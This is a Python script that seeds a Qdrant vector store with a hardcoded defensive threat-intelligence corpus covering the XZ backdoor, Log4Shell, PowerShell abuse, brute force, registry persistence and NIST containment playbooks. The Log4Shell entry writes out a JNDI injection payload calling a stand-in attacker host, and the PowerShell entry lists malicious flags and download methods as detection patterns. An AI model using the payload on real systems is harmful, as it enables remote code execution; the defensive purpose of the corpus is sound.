#!/usr/bin/env bash
# scripts/seed_threat_intel.py
"""
Master Threat Intelligence and Playbook Seeder.
Populates Qdrant with verified MITRE ATT&CK techniques, CVE incident guides,
and NIST SP 800-61 containment playbooks.
"""

import asyncio
import sys
from pathlib import Path

# Ensure project root is in sys.path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from src.logger import get_logger
from src.rag.ingestion import (
    MarkdownHeaderChunker,
    ThreatDocument,
    build_qdrant_points,
)
from src.rag.qdrant_client import qdrant_manager

logger = get_logger("seed_threat_intel")


# Verified Master Corpus of Security Knowledge
CYBER_KNOWLEDGE_CORPUS = [
    ThreatDocument(
        doc_id="cve-2024-3094-xz-backdoor",
        title="CVE-2024-3094: XZ Utils liblzma Backdoor in OpenSSH sshd",
        source="CISA Advisory / CVE Database",
        category="VULNERABILITY",
        metadata={"cve_id": "CVE-2024-3094", "severity": "CRITICAL", "cvss": 10.0, "affected": "sshd, liblzma"},
        content="""
# CVE-2024-3094: Malicious Code Injection in XZ Utils / liblzma

## Overview
A malicious backdoor was discovered in upstream xz-utils tarballs versions 5.6.0 and 5.6.1.
The backdoor modifies liblzma to intercept RSA decryption in OpenSSH sshd, allowing remote unauthorized authentication.

## Technical Details
The injection targets glibc and gcc during build, injecting an obfuscated object file that intercepts RSA_public_decrypt.
When an attacker connects to port 22 with a specific private key, arbitrary commands are executed as root before authentication.

## Indicators of Compromise (IoCs)
- Modified liblzma.so.5.6.0 or liblzma.so.5.6.1
- Unexplained child processes spawning directly from sshd daemon
- Network connections to port 22 with unexpected TLS-like binary payloads

## Containment & Remediation Playbook
1. Downgrade xz-utils to version 5.4.x or 5.2.x immediately.
2. Terminate and restart the OpenSSH daemon: `systemctl restart sshd`.
3. Check running memory using Yara signatures for the malicious signature `liblzma_extra_clean`.
4. Isolate the affected host from the internal network while verifying credentials.
"""
    ),
    ThreatDocument(
        doc_id="cve-2021-44228-log4shell",
        title="CVE-2021-44228: Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
        source="NVD / Apache Security",
        category="VULNERABILITY",
        metadata={"cve_id": "CVE-2021-44228", "severity": "CRITICAL", "cvss": 10.0, "affected": "log4j-core"},
        content="""
# CVE-2021-44228: Log4Shell Vulnerability Specification

## Overview
Apache Log4j2 versions 2.0-beta9 through 2.15.0 are vulnerable to Remote Code Execution through JNDI LDAP lookup strings.

## Attack Vector
An adversary injects the pattern `${jndi:ldap://attacker.com/a}` into any logged input field (e.g. User-Agent header, login forms).
Log4j resolves the JNDI lookup, connects to the malicious LDAP server, downloads a serialized Java payload, and executes it in memory.

## Containment & Remediation Playbook
1. Block outbound egress traffic on ports 389 (LDAP), 636 (LDAPS), 1099 (RMI), and 88 (Kerberos) at the network perimeter.
2. Upgrade log4j to version 2.17.1 or higher.
3. Temporary mitigation: Set system property `log4j2.formatMsgNoLookups=true` or remove JndiLookup.class from classpath.
"""
    ),
    ThreatDocument(
        doc_id="mitre-t1059-powershell",
        title="MITRE ATT&CK T1059.001: PowerShell Command and Scripting Interpreter",
        source="MITRE ATT&CK Enterprise Matrix",
        category="TECHNIQUE",
        metadata={"mitre_id": "T1059.001", "tactic": "TA0002 Execution", "platform": "Windows"},
        content="""
# T1059.001: PowerShell Execution

## Description
Adversaries use PowerShell to execute commands, download payloads, and stage in-memory payloads.
Common malicious flags include `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`, and `-EncodedCommand` (Base64 obfuscation).

## Detection Rules
- Process creation events for `powershell.exe` or `pwsh.exe` with base64 encoded strings in command line arguments.
- PowerShell downloading external files via `Invoke-WebRequest` or `Net.WebClient.DownloadString`.
- Unusually long command line arguments (> 500 characters).

## Mitigation & Containment
1. Enable ConstrainedLanguageMode: `$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"`.
2. Enable Script Block Logging (Event ID 4104) and Transcription.
3. Terminate the rogue powershell.exe process and quarantine the calling parent PID.
"""
    ),
    ThreatDocument(
        doc_id="mitre-t1110-brute-force",
        title="MITRE ATT&CK T1110: Brute Force Credential Access",
        source="MITRE ATT&CK Enterprise Matrix",
        category="TECHNIQUE",
        metadata={"mitre_id": "T1110", "tactic": "TA0006 Credential Access", "platform": "Linux, Windows"},
        content="""
# T1110: Brute Force

## Description
Adversaries attempt to gain access to accounts by systematically guessing passwords or using credential stuffing lists.

## Sub-techniques
- T1110.001: Password Guessing (trying many passwords against a single username like root or admin).
- T1110.003: Password Spraying (trying a single common password across hundreds of domain usernames to avoid lockout).

## Containment Playbook
1. Immediately ban the attacking source IP via firewall: `iptables -A INPUT -s <IP> -j DROP`.
2. If targeted user account is compromised, force an emergency password reset and revoke active Kerberos/JWT sessions.
3. Implement fail2ban or sliding-window rate limiting on SSH and web authentication gateways.
"""
    ),
    ThreatDocument(
        doc_id="mitre-t1547-persistence-registry",
        title="MITRE ATT&CK T1547.001: Boot or Logon Autostart Execution: Registry Run Keys",
        source="MITRE ATT&CK Enterprise Matrix",
        category="TECHNIQUE",
        metadata={"mitre_id": "T1547.001", "tactic": "TA0003 Persistence", "platform": "Windows"},
        content="""
# T1547.001: Registry Run Keys / Startup Folder

## Description
Adversaries achieve persistence by adding program execution entries into the Windows Registry Run or RunOnce keys.
When any user logs into the machine, Windows automatically executes the path specified in the registry value.

## Common Registry Paths
- `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`
- `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`
- `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`

## Remediation & Containment
1. Query registry keys using `reg query` or PowerShell `Get-ItemProperty`.
2. Delete malicious entries: `reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v <ValueName> /f`.
3. Locate and quarantine the dropped binary file from disk.
"""
    ),
    ThreatDocument(
        doc_id="nist-sp800-61-containment",
        title="NIST SP 800-61 Rev. 2: Computer Security Incident Handling Guide - Containment Strategies",
        source="NIST Guidelines",
        category="PLAYBOOK",
        metadata={"standard": "NIST SP 800-61", "phase": "Containment, Eradication & Recovery"},
        content="""
# NIST SP 800-61: Incident Containment Strategies

## Host Isolation Strategy
When an active compromise, C2 communication, or ransomware staging is detected:
1. Disconnect the affected host from the local network segment immediately to prevent lateral movement.
2. Do NOT power off or reboot the system (preserving volatile RAM memory artifacts for forensic memory dumps).
3. Block external egress traffic for the host's IP address at the perimeter firewall.

## Evidence Preservation Checklist
- Capture volatile RAM using LiME or WinPmem before executing destructive remediation.
- Dump running process trees and network socket tables (`netstat -ano` / `ss -tulpn`).
- Compute SHA256 hashes of suspicious executables for threat intelligence comparison.
"""
    )
]


async def seed_knowledge_base():
    """Seeds Qdrant with the threat intelligence corpus."""
    logger.info("seed_connecting_to_qdrant")
    await qdrant_manager.ensure_collection()

    chunker = MarkdownHeaderChunker(max_chars=1800, overlap_chars=200)
    all_chunks = []

    for doc in CYBER_KNOWLEDGE_CORPUS:
        chunks = chunker.chunk_document(doc)
        all_chunks.extend(chunks)

    logger.info("seed_chunks_generated", total_chunks=len(all_chunks), total_documents=len(CYBER_KNOWLEDGE_CORPUS))
    points = build_qdrant_points(all_chunks)

    logger.info("seed_upserting_points", point_count=len(points))
    await qdrant_manager.upsert_points(points)

    total_count = await qdrant_manager.count_points()
    logger.info("seed_complete", total_qdrant_points=total_count)


if __name__ == "__main__":
    asyncio.run(seed_knowledge_base())
